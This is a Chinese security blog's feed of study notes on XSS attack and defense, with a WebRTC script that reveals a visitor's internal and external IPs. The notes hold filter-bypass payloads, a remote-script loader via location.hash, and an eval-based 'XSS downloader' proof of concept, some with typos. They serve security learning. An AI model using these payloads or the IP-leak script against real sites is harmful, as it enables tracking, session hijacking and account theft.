        servers = {iceServers: [{urls: <span class="string">"stun:stun.services.mozilla.com"</span>}]}; 

    <span class="comment">//construct a new RTCPeerConnection </span>
    <span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints); 

    <span class="comment">//listen for candidate events </span>
    pc.onicecandidate = <span class="function"><span class="keyword">function</span><span class="params">(ice)</span></span>{ 

        <span class="comment">//skip non-candidate events </span>
        <span class="keyword">if</span>(ice.candidate){ 

            <span class="comment">//match just the IP address </span>
            <span class="keyword">var</span> ip_regex = <span class="regexp">/([0-9]{1,3}(\.[0-9]{1,3}){3})/</span> 
            <span class="keyword">var</span> ip_addr = ip_regex.exec(ice.candidate.candidate)[<span class="number">1</span>]; 

            <span class="comment">//remove duplicates </span>
            <span class="keyword">if</span>(ip_dups[ip_addr] === <span class="literal">undefined</span>) 
                callback(ip_addr); 

            ip_dups[ip_addr] = <span class="literal">true</span>; 
        } 
    }; 

    <span class="comment">//create a bogus data channel </span>
    pc.createDataChannel(<span class="string">""</span>); 

    <span class="comment">//create an offer sdp </span>
    pc.createOffer(<span class="function"><span class="keyword">function</span><span class="params">(result)</span></span>{ 

        <span class="comment">//trigger the stun server request </span>
        pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>{}); 

    }, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>{}); 
} 

<span class="comment">//Test: Print the IP addresses into the console </span>
getIPs(<span class="function"><span class="keyword">function</span><span class="params">(ip)</span></span>{<span class="built_in">console</span>.log(ip);});
</code></pre><h2 id="分析脚本">分析脚本</h2>
<p>Firefox 跟 Chrome支持WebRTC可以向STUN服务器请求，返回内外网IP，不同于XMLHttpRequest请求，STUN请求开发者工具当中看不到网络请求的。</p>
<h2 id="From">From</h2>
<blockquote>
<p><a href="https://github.com/diafygi/webrtc-ips" target="_blank" rel="external">https://github.com/diafygi/webrtc-ips</a></p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>前些天老外发出了一个脚本，可以使用JavaScript获取真实的内网IP和外网IP。</p>
</blockquote>
<h2 id="webrtc-ips：">webrtc-ips：</h2>
<pre><code><span class="c]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="javascript" scheme="http://www.m4ster.net/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（六）]]></title>
    <link href="http://www.m4ster.net/2014/12/30/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/30/《XSS跨站脚本攻击剖析与防御》学习笔记（六）/</id>
    <published>2014-12-30T07:05:37.000Z</published>
    <updated>2014-12-30T16:27:32.000Z</updated>
    <content type="html"><![CDATA[<h2 id="黑盒手动测试">黑盒手动测试</h2>
<p>在黑盒环境下，除了使用Web安全检测工具进行自动化测试，还可以依靠人工形式发掘跨站脚本漏洞。<br>针对页面的输入框进行测试，可以输入一些能触发XSS的敏感字符，如：  </p>
<blockquote>
<p><code>&lt; &gt; &quot; &#39; &amp; #</code></p>
</blockquote>
<p>然后在提交后查看源代码，查找输入的字符是否已被过滤或转义。<br>假设<code>&lt; &gt;</code>等标记符号被过滤了，我们还可以利用其他形式（如标签属性，事件等）触发XSS。</p>
<h2 id="源代码安全审计">源代码安全审计</h2>
<p>思路：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤。<br>分析哪些变量或动态内容来自用户并且可以自用控制，这要根据服务器端采用的程序语言而定。假设服务器端使用的是PHP语言，我们就可以将其全局办理作为检查对象。<br>PHP提供了以下几个超全局变量：  </p>
<blockquote>
<p>$GLOBALS<br>$_SERVER<br>$_GET<br>$_POST<br>$_FILES<br>$_COOKIE<br>$_SESSION<br>$_REQUEST<br>$_ENV  </p>
</blockquote>
<p>以上的全局变量都可以作为代码审计的主要对象，大部分可以作为用户的输入源，其中，$_SERVER、$_GET、$_POST和$_REQUEST经常用来获取用户的输入，在代码审计过程中要密切关注这些变量。</p>
<h2 id="JavaScript代码分析">JavaScript代码分析</h2>
<p>在白盒环境下，通过对Web程序代码进行安全审计，可以发掘初大量影藏在应用程序中的跨站漏洞。除此之外，还可以通过分析客户端的JavaScript程序越来越多地被使用在各种场合，其带来的安全问题也日渐突出。<br>由于JavaScript功能强大，能控制Web客户端的逻辑，甚至能操作用户的输入和输出。在这过程之中，如果用户的恶意输入没有被正确处理就可能产生XSS。</p>
<h3 id="DOM_Based_XSS">DOM Based XSS</h3>
<blockquote>
<p>待续……</p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="黑盒手动测试">黑盒手动测试</h2>
<p>在黑盒环境下，除了使用Web安全检测工具进行自动化测试，还可以依靠人工形式发掘跨站脚本漏洞。<br>针对页面的输入框进行测试，可以输入一些能触发XSS的敏感字符，如：  </p>
<blockquote>
<p><co]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（五）]]></title>
    <link href="http://www.m4ster.net/2014/12/30/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/30/《XSS跨站脚本攻击剖析与防御》学习笔记（五）/</id>
    <published>2014-12-30T06:27:37.000Z</published>
    <updated>2014-12-30T07:03:07.000Z</updated>
    <content type="html"><![CDATA[<h2 id="网络钓鱼">网络钓鱼</h2>
<p>网络钓鱼是一种利用网络进行诈骗的手段，主要通过对受害者心理弱点、好奇心、信任度等心理陷阱来实现诈骗，属于社会工程学的一种。</p>
<h2 id="XSS_Phishing">XSS Phishing</h2>
<p>普通的网络钓鱼成功率极低，结合了XSS技术的网络钓鱼是最具威胁的一种攻击手段。<br>XSS跨站脚本最大的特性是能够在网页中插入并运行JS，不仅能劫持用户的当前会话，同时还能控制浏览器的部分行为。利用这一点攻击者便能实施完美的钓鱼攻击，这种基于XSS的钓鱼技术被称为XSS Phishing。</p>
<h3 id="钓鱼页面">钓鱼页面</h3>
<p>攻击者会构造钓鱼页面。一般钓鱼网页的主要内容是登录表单部分，其代码可以从真实页面复制过去，然后修改接收提交信息的地址。</p>
<h3 id="记录信息的脚本">记录信息的脚本</h3>
<p>在远程服务器上，会存放一个用来接收和记录帐号和密码信息的文件，这文件的功能可以是恶意攻击者编写的用于保存提交上去的用户信息。</p>
<h3 id="XSS_Phishing_Exploit">XSS Phishing Exploit</h3>
<p>攻击者在页面中插入JS代码，使用JS创建一个iframe覆盖目标页面，再加载远程域伪造的钓鱼页面。</p>
<h2 id="XSS钓鱼的方式">XSS钓鱼的方式</h2>
<p>攻击者钓鱼的方式可谓是五花八门，层出不穷。</p>
<h3 id="XSS重定向钓鱼">XSS重定向钓鱼</h3>
<p>这种钓鱼方式是把当前页面重定向到一个钓鱼网站上。</p>
<h3 id="HTML注入式钓鱼">HTML注入式钓鱼</h3>
<p>HTML注入式钓鱼是指直接利用XSS漏洞注射HTML/JavaScript代码到页面当中。可以在正常页面当中嵌入一个form表单并覆盖屌原页面的显示，强迫用户输入帐号和密码等信息。</p>
<h3 id="XSS跨框架钓鱼">XSS跨框架钓鱼</h3>
<p>这种方式是通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼。此时主页面依然处在正常网站的域名下，因此具有很高的迷惑性。</p>
<h3 id="Flash钓鱼">Flash钓鱼</h3>
<p>Flash钓鱼甚至不要求网站存在XSS漏洞，只要攻击者把精心构造的Flash文件（比如一个假冒的登录框）上传到远程服务器，然后在目标网站中使用<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code>标签去引用Flash即可。</p>
<h2 id="高级钓鱼技术">高级钓鱼技术</h2>
<p>即利用JS的事件监听，将用户在页面中输入的信息提交到指定的接收脚本。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="网络钓鱼">网络钓鱼</h2>
<p>网络钓鱼是一种利用网络进行诈骗的手段，主要通过对受害者心理弱点、好奇心、信任度等心理陷阱来实现诈骗，属于社会工程学的一种。</p>
<h2 id="XSS_Phishing">XSS Phishing</h2>
<p>普通的网]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（四）]]></title>
    <link href="http://www.m4ster.net/2014/12/30/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/30/《XSS跨站脚本攻击剖析与防御》学习笔记（四）/</id>
    <published>2014-12-30T05:32:15.000Z</published>
    <updated>2014-12-30T06:26:54.000Z</updated>
    <content type="html"><![CDATA[<h2 id="Cookie基础介绍">Cookie基础介绍</h2>
<p>Cookie是用户浏览网页时网站存储在用户机器上的小文本文件，文件里记录了与用户相关的一些状态或设置，比如用户名、ID、访问次数等。当用户下一次访问这个网站的时候，网站会先访问用户机器上对应的该网站的Cookie文件，并从中读取信息，以便用户实现快速访问。</p>
<h3 id="Cookie的作用">Cookie的作用</h3>
<p>当以特定的账户和密码登录网站后，如果每一步操作都要求重新输入密码加以确认，这样会让人不甚其烦，所以浏览器和Web系统有必要对用户进行身份识别和会话跟踪，由此Cookie技术就诞生了。</p>
<h3 id="Cookie的类型">Cookie的类型</h3>
<p>Cookie的操作十分简单，通过Document对象访问Cookie。若要创建一个Cookie，只要将特定格式的字符串赋给document.cookie即可：  </p>
<blockquote>
<p>cookieName=cookieValue;expirationdate;path</p>
</blockquote>
<h3 id="Cookie常见属性：">Cookie常见属性：</h3>
<blockquote>
<p>Domain——设置关联Cookie的域名<br>Expires——通过给定一个过期时间来创建一个持久化的Cookie<br>HttpOnly——用于避免Cookie被JavaScript访问<br>Name——Cookie的名称<br>Path——关联到Cookie的路径；默认为/<br>Value——读写Cookie的值<br>Secure——用于指定Cookie需要通过安全Socket层连接传递</p>
</blockquote>
<h2 id="Cookie的安全">Cookie的安全</h2>
<p>Cookie的安全一直是人们最关心的话题。最初Cookie被设计出来的时候也考虑了一些安全因素，比如对内容加密，只有对应的服务器才能读懂。<br>然而，由于Cookie保存在客户端，这意味着它随时可能被窃取和滥用，如果我们登录网站后没有退出帐号（<code>销毁Cookie</code>），当其他成员使用同一台计算机登录时，利用之前的Cookie，就能窃取我们帐号的“权限”。  </p>
<h3 id="Cookie攻击原理剖析">Cookie攻击原理剖析</h3>
<p>如前文所述，虽然Cookie信息是经过加密的，即使被网络上一些别有用心的人接货也不必过于担心，但现在遇到的问题是，窃取Cookie的人不需要知道这些字符串的含义，只要把Cookie信息向服务器提交并通过验证后，他们就可以冒充受害人的身份登录网站，这种行为一般叫做Cookie欺骗或者Cookie会话攻击。  </p>
<p>攻击者通常利用网站XSS漏洞发起攻击。假设一个网站存在存储型XSS（或反射型XSS），攻击者就可以向漏洞页面写入窃取Cookie信息的恶意代码，在用户浏览XSS网页时，攻击者能够获取受害者当前浏览器中的Cookie信息。  </p>
<h3 id="会话劫持剖析">会话劫持剖析</h3>
<p>通过JS获取到浏览者的Cookie，记入攻击者远程数据库。攻击者通过获取到的Cookie可以执行一些只有该浏览者才有权限的操作。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Cookie基础介绍">Cookie基础介绍</h2>
<p>Cookie是用户浏览网页时网站存储在用户机器上的小文本文件，文件里记录了与用户相关的一些状态或设置，比如用户名、ID、访问次数等。当用户下一次访问这个网站的时候，网站会先访问用户机器上对应的该网站的C]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（三）]]></title>
    <link href="http://www.m4ster.net/2014/12/30/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/30/《XSS跨站脚本攻击剖析与防御》学习笔记（三）/</id>
    <published>2014-12-30T01:49:29.000Z</published>
    <updated>2014-12-30T03:31:29.000Z</updated>
    <content type="html"><![CDATA[<h2 id="Shellcode">Shellcode</h2>
<p>在跨站脚本当中，是指JS等脚本编写的XSS利用代码</p>
<h2 id="Exploit">Exploit</h2>
<p>Exploit的英文意思就是利用，再黑客眼里就是漏洞利用。通常表示完整编写好的漏洞利用工具（或程序），具有一定攻击性。Exploit中往往包含了Shellcode</p>
<h2 id="POC">POC</h2>
<p>即Proof of Concept的缩写，是一段证明漏洞存在的程序代码片段。</p>
<blockquote>
<p>在XSS中调用Shellcode的方式有很多种。</p>
</blockquote>
<h2 id="动态调用远程JavaScript">动态调用远程JavaScript</h2>
<p>使用script标签，其src属性指向脚本地址，然后把引用JS的代码插入到网页的<code>&lt;head&gt;</code>标签后。</p>
<h2 id="使用window-location-hash">使用window.location.hash</h2>
<p>location是JavaScript管理地址栏的内置对象。比如location.href用来管理页面的URL，用location.href=url就可以直接将页面重定向URL，而location.hash则可以用来获取或设置页面的标签值。比如<code>http://domain/#admain的location.hash=&quot;#admin&quot;</code>，利用这个属性值可以做一件非常有意义的事情。如：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.bug.com/view.php?sort="&gt;<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#alert('XSS')</div></pre></td></tr></table></figure>

<p>substr()可在字符串中抽取从start下表开始的指定数目的字符，所以location.hash.substr(1)的作用是抽取“#”符号后面的字符，即alert(‘XSS’)。通过这个技巧可以把Shellcode写到地址参数中再执行。<br><strong>ajax提交post请求：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="string">"index.php?mod=blog&act=dopost"</span>;</div><div class="line"><span class="keyword">var</span> content = <span class="string">"blog_content = Test"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_sd_Post</span><span class="params">(Url,Args)</span></span>{</div><div class="line">	<span class="keyword">var</span> xmlhttp;</div><div class="line">	<span class="keyword">var</span> error;</div><div class="line">	<span class="built_in">eval</span>(<span class="string">'try {xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");}catch(e){xmlhttp = null; error = e;}'</span>);}</div><div class="line">	<span class="keyword">if</span>(<span class="literal">null</span> != xmlhttp){</div><div class="line">		xmlhttp.Open(<span class="string">"Post"</span>,Url,<span class="literal">false</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"x-requested-with"</span>,<span class="string">"XMLHttpRequest"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Referer"</span>,<span class="string">"http://www.my.com/api_proxy.html"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Accept"</span>,<span class="string">"application/json,text/javascript,*/*"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencode"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Host"</span>,<span class="string">"www.my.com"</span>);</div><div class="line">		xmlhttp.Send(Args);</div><div class="line">		strText = xmlhttp.responseText;</div><div class="line">	}</div><div class="line">_sd_post(url,content)</div></pre></td></tr></table></figure>

<p><strong>利用window.location.hash写入地址栏：</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.bug.com/view.php?sort="&gt;<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#【Exploit】</div></pre></td></tr></table></figure>

<p>这个Exp还可以经过各种编码处理以加强迷惑性。</p>
<h2 id="XSS_Downloader">XSS Downloader</h2>
<p>另一种存储和调用Shellcode的方法，即将其存储到网站的数据库中（<code>包括网页信息、文章内容、个人资料等地方</code>），然后再把它下载下来。<br>简单地说，就是一个JS获取网页内容的代码。事先把Shellcode写再网站的某个页面，再利用XMLHTTP控件向网站发送HTTP请求（POST或GET），然后执行返回的数据，一个简单的POC：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">funciton XSS(){</div><div class="line">	a = <span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHTTP'</span>);</div><div class="line">	a.Open(<span class="string">'get'</span>,<span class="string">'http://www.bug.com/11211.html'</span>,flase;);</div><div class="line">	a.send();</div><div class="line">	b=a.responseText;</div><div class="line">	<span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.substring(b.indexOf(<span class="string">'BOF|'</span>) + <span class="number">4</span>,b.indexOf(<span class="string">'|EOF'</span>))));</div><div class="line">}</div><div class="line">XSS();</div></pre></td></tr></table></figure>

<p>而在<code>http://www.bug.com/11211.html</code>页面写入Shellcode代码：</p>
<blockquote>
<p><code>Xx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212</code></p>
</blockquote>
<h2 id="备选存储技术">备选存储技术</h2>
<p>譬如HTTP cookie、Flash共享对象、UserData、locaStorage等。<br>在Cookie中存储Shellcode的POC如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setShellCodz</span><span class="params">(codz)</span></span>{</div><div class="line">	<span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">	exp.setTime(exp.getTime() + <span class="number">365</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>);</div><div class="line">	<span class="built_in">document</span>.cookie = <span class="string">'shellcode='</span> + <span class="built_in">escape</span>(codz)+<span class="string">';'</span> + exp.toGMTString();</div><div class="line">}</div></pre></td></tr></table></figure>

<p>HTML5也提供了两种在客户端存储数据的新方法，包括localStorage和sessionStroage，其用法基本相同。以localStroage为例，存储数据的方法是直接给window.localStorage添加一个属性，如：  </p>
<blockquote>
<p><code>window.localStorage.a</code></p>
</blockquote>
<p>或者</p>
<blockquote>
<p><code>window.localStorage[&quot;a&quot;]</code></p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Shellcode">Shellcode</h2>
<p>在跨站脚本当中，是指JS等脚本编写的XSS利用代码</p>
<h2 id="Exploit">Exploit</h2>
<p>Exploit的英文意思就是利用，再黑客眼里就是漏洞利用。通常表示完整编写好的漏]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（二）]]></title>
    <link href="http://www.m4ster.net/2014/12/26/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/26/《XSS跨站脚本攻击剖析与防御》学习笔记（二）/</id>
    <published>2014-12-26T07:57:01.000Z</published>
    <updated>2014-12-26T10:20:10.000Z</updated>
    <content type="html"><![CDATA[<h2 id="XSS构造剖析">XSS构造剖析</h2>
<blockquote>
<p>介绍如何绕过服务端的XSS过滤系统、如何构造强壮的XSS利用代码</p>
</blockquote>
<h2 id="绕过XSS-Filter">绕过XSS-Filter</h2>
<p>现实中大多数的Web程序并非都是脆弱不堪、漏洞百出的。优秀的开发者是不容许自己的代码出现任何Bug 或漏洞的。<br>一般，为了防止XSS漏洞的出现，会在Web应用中设计一个XSS Filter，即跨站脚本过滤器，用于分析用户提交的输入，并消除潜在的跨站脚本攻击、恶意的HTML或简单的HTML格式错误等。  </p>
<blockquote>
<p>XSS Filter，一般是基于黑白名单的安全过滤策略。<br>白名单存放的是可信赖、对应用程序不构成威胁的数据列表<br>黑名单则相反，存储的是不受信赖的数据列表</p>
</blockquote>
<p>如果程序使用了基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS Filter会对所有的输入进行效验，如果检测到了黑名单中的数据，便进行拦截、编码和消毒过滤等处理。</p>
<p>凡使用黑名单过略策略的XSS Filter，或多或少都会存在被绕过的可能。  </p>
<h2 id="从攻击者的角度来探讨、展示绕过XSS_Filter的测试用例">从攻击者的角度来探讨、展示绕过XSS Filter的测试用例</h2>
<h3 id="利用&lt;&gt;标记注释HTML/JavaScript">利用<code>&lt;&gt;</code>标记注释HTML/JavaScript</h3>
<p>如果用户可以随心所欲的引入<code>&lt;&gt;</code>标记，那么他可以操作一个HTML标签，然后通过<code>&lt;script&gt;</code>标签就能任意插入脚本代码。如：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="利用HTML标签属性值执行XSS">利用HTML标签属性值执行XSS</h3>
<p>用户不能随意构造HTML标签，但还可以使用其他形式来执行XSS，例如HTML标签的属性值。如：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">javascript:alert('XSS')</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">table</span> <span class="attribute">background</span>=<span class="value">"javascript:alert('XSS')"</span>&gt;</span><span class="tag">&lt;/<span class="title">table</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="空格、回车、Tab">空格、回车、Tab</h3>
<p>如果XSS Filter仅仅是把敏感字符列入黑名单处理，可以尝试使用空格、回车、Tab键来绕过限制。如：  </p>
<blockquote>
<p><code>&lt;table background=&quot;javas    cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/table&gt;</code></p>
</blockquote>
<p>注意的一点是，javas和cript之间的不是空格，而是按下Tab添加的缩进，而且这种方法部分浏览器是不支持的。<br>也有时，浏览器引擎没有把换行符解析为语句的终止符，因为到换行处并不是一个完整的语句，JS会继续处理发现的内容，直到语句完整为止。如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">table</span> <span class="attribute">background</span>=<span class="value">"javas</span></span></div><div class="line">cript:</div><div class="line">alert('XSS')"&gt;<span class="tag">&lt;/<span class="title">table</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="对标签属性值转码">对标签属性值转码</h3>
<p>对于普通的HTML标记的属性值进行过滤，用户可以通过编码处理来绕过，因为HTML中属性本身是支持<a href="http://zh.wikipedia.org/wiki/ASCII%E7%A0%81" target="_blank" rel="external">ASCII码</a>形式的。如：  </p>
<blockquote>
<p><code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot; /&gt;</code></p>
</blockquote>
<p>替换成：</p>
<blockquote>
<p><code>&lt;img src=&quot;javascript&amp;#116&amp;#58alert(/XSS/);&quot; /&gt;</code></p>
</blockquote>
<h3 id="产生自己的事件">产生自己的事件</h3>
<p>JS与HTML的交互是通过事件来实现的，时间就是浏览器自身的某种动作，比如click、mouseover、load等，而想要时间的函数就叫作事件的处理函数（<code>或事件监听器</code>）。如：</p>
<blockquote>
<p><code>&lt;img src=x onerror=javascript:alert(/XSS/)&gt;</code></p>
</blockquote>
<h3 id="利用CSS跨站">利用CSS跨站</h3>
<p>XSS跨站的另一个载体是CSS样式表，使用CSS样式表执行JS具有隐蔽、灵活多变等特点，但也有一个缺陷，就是不同版本的浏览器可能存在不兼容的问题。<br>直接使用CSS执行JS代码的示例如下：</p>
<blockquote>
<p><code>body{ background-image:url(&quot;javascript:alert(/XSS/)&quot;)}</code></p>
</blockquote>
<h3 id="扰乱过滤规则">扰乱过滤规则</h3>
<h4 id="一个正常的XSS输入">一个正常的XSS输入</h4>
<blockquote>
<p><code>&lt;img src=x onerror=javascript:alert(&#39;XSS&#39;) /&gt;</code></p>
</blockquote>
<h4 id="大小写混淆的XSS">大小写混淆的XSS</h4>
<blockquote>
<p><code>&lt;iMg srC=x OnErrOr=JavaScriPt:AlerT(&#39;XSS&#39;) /&gt;</code></p>
</blockquote>
<h4 id="不使用引号的XSS">不使用引号的XSS</h4>
<blockquote>
<p><code>&lt;img src=x onerror=javascript:alert(/XSS/) /&gt;</code></p>
</blockquote>
<h4 id="利用浏览器特性的XSS">利用浏览器特性的XSS</h4>
<blockquote>
<p><code>&lt;img/src=x/onerror=javascript:alert(&#39;XSS&#39;) /&gt;</code></p>
</blockquote>
<h4 id="给代码添加注释">给代码添加注释</h4>
<blockquote>
<p><code>&lt;div style=&quot;widt/*-*/h:expre/*XSS*/ssion(alert(&#39;XSS&#39;))&quot;&gt;</code></p>
</blockquote>
<h3 id="利用字符编码">利用字符编码</h3>
<p>HTML标签中的某些属性值可以使用<code>&amp;#ASCII</code>方式编码，这种XSS转码支持十进制和十六进制形式。举例：<br>以<code>&lt;img src=x onerror=javascript:alert(&#39;XSS&#39;) /&gt;</code>举例，他的属性值是  </p>
<blockquote>
<p><code>javascript:alert(&#39;XSS&#39;)</code></p>
</blockquote>
<p>进行十六进制转码(<code>#&amp;</code>)后得到：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&<span class="id">#106</span>;&<span class="id">#97</span>;&<span class="id">#118</span>;&<span class="id">#97</span>;&<span class="id">#115</span>;&<span class="id">#99</span>;&<span class="id">#114</span>;&<span class="id">#105</span>;&<span class="id">#112</span>;&<span class="id">#116</span>;&<span class="id">#58</span>;&<span class="id">#97</span>;&<span class="id">#108</span>;&<span class="id">#101</span>;&<span class="id">#114</span>;&<span class="id">#116</span>;&<span class="id">#40</span>;&<span class="id">#39</span>;&<span class="id">#88</span>;&<span class="id">#83</span>;&<span class="id">#83</span>;&<span class="id">#39</span>;&<span class="id">#41</span>;</div></pre></td></tr></table></figure>

<p>完整的XSS Exploit如下</p>
